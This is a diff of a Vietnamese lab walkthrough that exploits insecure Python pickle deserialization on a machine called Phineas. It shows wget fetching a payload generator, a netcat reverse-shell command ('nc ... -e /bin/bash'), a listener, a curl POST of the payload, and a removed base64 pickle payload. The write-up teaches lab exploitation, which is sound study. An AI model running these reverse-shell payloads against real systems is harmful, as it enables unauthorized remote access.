@@ -89,14 +89,20 @@ Trong số các folder khởi đầu của máy Phineas, chỉ có duy nhất /w
 
 Có thể thấy nó bị dính lỗi Insecure Deserialization
 
-Command exploit
+Dùng lệnh **ip a** để tìm kiếm ip của máy phineas khi ta ssh trên kali ->10.0.2.6
+Command exploit: tại terminal root kali
 >wget https://gist.githubusercontent.com/kriss-u/085569495cb930e398759c0cbf45e3b7/raw/15fe119ed307ac69673bcaadd9fab84c32a85a00/pickle-payload-py3.py
 
->python3 pickle-payload-py3.py "nc 10.0.2.5 9999 -e /bin/bash"
+>python3 pickle-payload-py3.py "nc 10.0.2.6 4444 -e /bin/bash"
 
->curl -d "awesome=gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAxMC4wLjIuMTUgOTk5OSAtZSAvYmluL2Jhc2iUhZRSlC4=" -X POST http://127.0.0.1:5000/heaven
+>nc -nlvp 4444
 
+Tại terminal ssh phineas 
+>curl -d "awesome=Ket_qua_tai_cau_lenh_python_tren" -X POST http://127.0.0.1:5000/heaven
 
+Quay về terminal root kali
+
+![image](https://user-images.githubusercontent.com/97771705/223911610-5bafd821-956c-492d-b454-0379404ad454.png)
 
 
 
